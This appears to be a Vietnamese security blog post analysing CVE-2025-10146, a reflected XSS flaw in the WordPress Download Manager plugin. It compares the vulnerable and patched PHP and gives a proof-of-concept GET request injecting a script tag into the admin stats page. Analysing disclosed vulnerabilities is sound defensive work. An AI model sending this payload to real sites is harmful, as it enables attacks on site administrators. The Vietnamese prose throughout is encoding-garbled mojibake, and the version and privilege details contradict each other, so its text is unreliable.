---
title: CVE-2025-10146 Analysis & POC
description: Security Vulnerability in WordPress Download Manager Plugin.
date: 2025-09-22 11:18:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, plugin, xss]
---

L·ªó h·ªïng trong plugin **Download Manager** tr∆∞·ªõc phi√™n b·∫£n **3.3.24**. D·ªØ li·ªáu ƒë∆∞·ª£c l·∫•y t·ª´ **GET** request ƒë∆∞·ª£c in tr·ª±c ti·∫øp v√†o **HTML attribute**, **reflected XSS** x·∫£y ra khi ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn truy c·∫≠p v√†o ƒë∆∞·ªùng d·∫´n do attack cung c·∫•p.
- **CVE ID**: [CVE-2025-10146](https://www.cve.org/CVERecord?id=CVE-2025-10146)
- **Product**: [WordPress Download Manager Plugin](https://wordpress.org/plugins/download-manager)
- **Vulnerability Type**: Cross Site Scripting
- **Affected Versions**: <= 3.3.23
- **CVSS severity**: Medium (7.1) 
- **Required Privilege**: Unauthenticated

## Requirements
- [**Local WordPress and Debugging**](https://w41bu1.github.io/posts/wordpress-local-and-debugging/)
- **Download Manager**: v3.3.23(vul) v√† v3.3.24(fix)
- **diff tool**: **meld** ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version

## Analysis
### Patch Diff
D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.
C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file **src/Admin/views/stats/history.php**.

**B·∫£n l·ªói**:

```php
<?php if (!empty($user_ids)): ?>
    <div class="clear-filter">
        <?php
        $get_params_xu = $get_params;
        unset($get_params_xu['user_ids']);
        $reset_url = add_query_arg($get_params_xu, 'edit.php');
        ?>
        <a href="<?php echo $reset_url; ?>" class="clear-btn" title="<?php _e('Clear user filter', 'download-manager'); ?>">
            <i class="fas fa-times"></i>
        </a>
    </div>
<?php endif; ?>
```

L·∫•y **GET params** v√† g√°n tr·ª±c ti·∫øp v√†o **href** c·ªßa th·∫ª `<a>` m√† kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá => nguy c∆° **reflected XSS**.

**B·∫£n v√°**:

```php
<?php if (!empty($user_ids)): ?>
    <div class="clear-filter">
        <?php
        $get_params_xu = $get_params;
        unset($get_params_xu['user_ids']);
        $get_params_xu = \WPDM\__\__::sanitize_array($get_params_xu, 'safetxt');

        $reset_url = add_query_arg($get_params_xu, 'edit.php');
        ?>
        <a href="<?php echo esc_url($reset_url); ?>" class="clear-btn" title="<?php _e('Clear user filter', 'download-manager'); ?>">
            <i class="fas fa-times"></i>
        </a>
    </div>
<?php endif; ?>
```

B·∫£n v√° ƒë√£ **sanitize** m·∫£ng **GET params** b·∫±ng `sanitize_array` v√† s·ª≠ d·ª•ng `esc_url`  ƒë·ªÉ **escape URL** => an to√†n h∆°n.

![Patch Diff](images/posts/2025-09-22-CVE-2025-10146/patch_diff.png)

### How It Work?
Ta c·∫ßn t√¨m URL th·ª±c s·ª± ƒë·ªÉ inject GET params ch·ª©a XSS payload.

**src/Admin/views/stats/history.php** ch·ª©a c√°c tag **php**, **HTML** v√† n·∫±m trong **views** cho th·∫•y file n√†y ƒë∆∞·ª£c include ·ªü n∆°i n√†o ƒë√≥ trong m√£ ngu·ªìn plugin.

Ta t√¨m v·ªõi t·ª´ kh√≥a `history.php` trong th∆∞ m·ª•c plugin

![Search 1](images/posts/2025-09-22-CVE-2025-10146/search1.png)

üëâ Kh√¥ng c√≥ k·∫øt qu·∫£ n√†o kh·ªõp. Kh·∫£ nƒÉng cao n√≥ ƒë∆∞·ª£c include ƒë·ªông nh∆∞ n√†y `{$file_name}.php`. Ta t√¨m v·ªõi regex `\{.*\}\.php`:

![Search 2](images/posts/2025-09-22-CVE-2025-10146/search2.png)

**src/Admin/views/stats/history.php** ƒë∆∞·ª£c include trong **src/Admin/views/stats.php**

URL th·ª±c s·ª± ƒë·ªÉ truy c·∫≠p ƒë∆∞·ª£c khai b√°o ·ªü ƒë·∫ßu file **stats.php** 

```
$base_page_uri = "edit.php?post_type=wpdmpro&page=wpdm-stats";
```

T∆∞∆°ng t·ª± **history.php**, **stats.php** c≈©ng ƒë∆∞·ª£c include ·ªü ƒë√¢u ƒë√≥ trong m√£ ngu·ªìn plugin. Nh∆∞ng kh√¥ng c·∫ßn quan t√¢m v√¨ ta ƒë√£ t√¨m ƒë∆∞·ª£c URL th·ª±c s·ª±.

ƒê·ªÉ ch·∫Øc ch·∫Øn h∆°n, ta ƒë·∫∑t **breakpoint** t·∫°i v·ªã tr√≠ l·ªó h·ªïng trong file **src/Admin/views/stats/history.php**, sau ƒë√≥ b·∫Øt ƒë·∫ßu debug v√† truy c·∫≠p URL:

```
edit.php?post_type=wpdmpro&page=wpdm-stats
```

![Debug](images/posts/2025-09-22-CVE-2025-10146/debug.png)

Tr∆∞·ªõc ti√™n, plugin l·∫•y to√†n b·ªô **GET parameters** v√†o `$get_params`. 

N·∫øu `$user_ids` kh√¥ng r·ªóng, plugin s·∫Ω t·∫°o **n√∫t ‚ÄúClear filter‚Äù**. ƒê·ªÉ l√†m n√∫t n√†y ho·∫°t ƒë·ªông, c·∫ßn m·ªôt URL m√† **kh√¥ng c√≤n `user_ids`** n·ªØa, n√™n plugin l√†m nh∆∞ sau:

```php
$get_params_xu = $get_params;        // copy to√†n b·ªô GET parameters
unset($get_params_xu['user_ids']);   // b·ªè user_ids ra kh·ªèi m·∫£ng
$reset_url = add_query_arg($get_params_xu, 'edit.php'); // t·∫°o URL m·ªõi
```

* `unset($get_params_xu['user_ids'])` => lo·∫°i b·ªè b·ªô l·ªçc `user_ids` kh·ªèi URL.
* `add_query_arg($get_params_xu, 'edit.php')` > t·∫°o URL m·ªõi v·ªõi c√°c tham s·ªë c√≤n l·∫°i.

Cu·ªëi c√πng, URL n√†y ƒë∆∞·ª£c g·∫Øn v√†o n√∫t ‚ÄúClear filter‚Äù:

```php
<a href="<?php echo $reset_url; ?>" class="clear-btn">...</a>
```

**K·∫øt qu·∫£:** Khi ng∆∞·ªùi d√πng nh·∫•n n√∫t, trang s·∫Ω load l·∫°i **m√† kh√¥ng c√≤n b·ªô l·ªçc user_ids**, t·ª©c l√† `‚Äúclear filter‚Äù`.

## Exploit 
### Detect XSS
G·ª≠i GET request ch·ª©a XSS payload:

```http
GET /wp-admin/edit.php?post_type=wpdmpro&page=wpdm-stats&user_ids[0]=1&payload="></a><script>alert(document.domain)</script> HTTP/1.1
```

Ta th√™m `"></a>` ƒë·ªÉ ƒë√≥ng th·∫ª `<a>` sau ƒë√≥ th√™m 1 script d·ªÉ `alert()`

![XSS](images/posts/2025-09-22-CVE-2025-10146/xss.png)

üëâ XSS th√†nh c√¥ng, khi ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn truy c·∫≠p v√†o URL do attacker cung c·∫•p th√¨ **reflected XSS** x·∫£y ra => X·∫£y ra ƒë√∫ng k·ªãch b·∫£n **Unauthenticated**

---

## Conclusion

L·ªó h·ªïng **CVE-2025-10146** trong plugin **WordPress Download Manager <= 3.3.23** l√† **reflected XSS**, x·∫£y ra khi d·ªØ li·ªáu t·ª´ **GET request** ƒë∆∞·ª£c in tr·ª±c ti·∫øp v√†o **HTML attribute** m√† kh√¥ng ƒë∆∞·ª£c sanitize ho·∫∑c escape. Ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o ƒë∆∞·ªùng d·∫´n n√†y (admin/author) c√≥ th·ªÉ b·ªã t·∫•n c√¥ng n·∫øu truy c·∫≠p URL do attacker t·∫°o.

B·∫£n v√° **3.3.24** ƒë√£:

1. **Sanitize m·∫£ng GET parameters** (`sanitize_array`) ƒë·ªÉ lo·∫°i b·ªè k√Ω t·ª± nguy hi·ªÉm.
2. **Escape URL** khi in ra HTML (`esc_url`) ƒë·ªÉ ngƒÉn XSS.

**Key takeaways**:

* Lu√¥n **sanitize v√† escape d·ªØ li·ªáu** t·ª´ ng∆∞·ªùi d√πng tr∆∞·ªõc khi render ra HTML.
* Ki·ªÉm tra **quy·ªÅn truy c·∫≠p** tr∆∞·ªõc khi x·ª≠ l√Ω ho·∫∑c hi·ªÉn th·ªã d·ªØ li·ªáu nh·∫°y c·∫£m.
* Ngay c·∫£ c√°c role th·∫•p (contributor) v·∫´n c√≥ th·ªÉ tr·ªü th√†nh ƒëi·ªÉm t·∫•n c√¥ng n·∫øu plugin kh√¥ng b·∫£o v·ªá ƒë√∫ng c√°ch.
* C·∫≠p nh·∫≠t plugin th∆∞·ªùng xuy√™n l√† c√°ch ph√≤ng th·ªß ƒë∆°n gi·∫£n nh∆∞ng hi·ªáu qu·∫£ nh·∫•t.

---

## References

[Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[WordPress Download Manager Plugin <= 3.3.24 is vulnerable to Cross Site Scripting (XSS)](https://patchstack.com/database/wordpress/plugin/download-manager/vulnerability/wordpress-download-manager-plugin-3-3-23-reflected-cross-site-scripting-via-user-ids-parameter-vulnerability) 

---